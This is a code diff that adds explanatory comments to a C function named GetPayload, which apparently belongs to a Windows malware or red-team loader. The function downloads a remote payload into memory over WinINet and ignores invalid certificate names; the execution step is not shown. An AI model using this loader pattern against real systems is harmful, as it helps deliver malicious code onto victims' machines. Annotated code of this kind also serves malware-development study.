@@ -62,7 +62,7 @@ BOOL GetPayload(LPCWSTR srcurl, PBYTE* sPayloadBytes, size_t* sPayloadSize) {
     HINTERNET hInternet = NULL;
 
     HINTERNET hInternetFile = NULL;
-
+    // open an hInternet Handle
     hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
 
     hInternetFile = InternetOpenUrlW(hInternet, srcurl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
@@ -74,10 +74,13 @@ BOOL GetPayload(LPCWSTR srcurl, PBYTE* sPayloadBytes, size_t* sPayloadSize) {
         return FALSE;
     }
 
+    // Allocate a temp 1024 bytes memory region
     pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
 
     while (TRUE)
     {
+
+        // InternetReadFile will report less read bytes if the final chunk is less than 1024 bytes
         if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
             #ifdef DEBUG
             printf("[!] InternetReadFile failed with error: %d \s", GetLastError());
@@ -85,11 +88,12 @@ BOOL GetPayload(LPCWSTR srcurl, PBYTE* sPayloadBytes, size_t* sPayloadSize) {
             return FALSE;
         }
 
+        // update the amount of readable bytes to the total size
         sSize += dwBytesRead;
 
-        if (pBytes == NULL) {
+        if (pBytes == NULL) { // if pBytes haven't been allocated yet.
             pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
-        } else {
+        } else { // Relloc every time sSize updates
             pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
         }
 
@@ -97,6 +101,7 @@ BOOL GetPayload(LPCWSTR srcurl, PBYTE* sPayloadBytes, size_t* sPayloadSize) {
             return FALSE;
         }
 
+        // Add the temp buffer to the end of the total buffer
         memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
 
         memset(pTmpBytes, '\0', dwBytesRead);
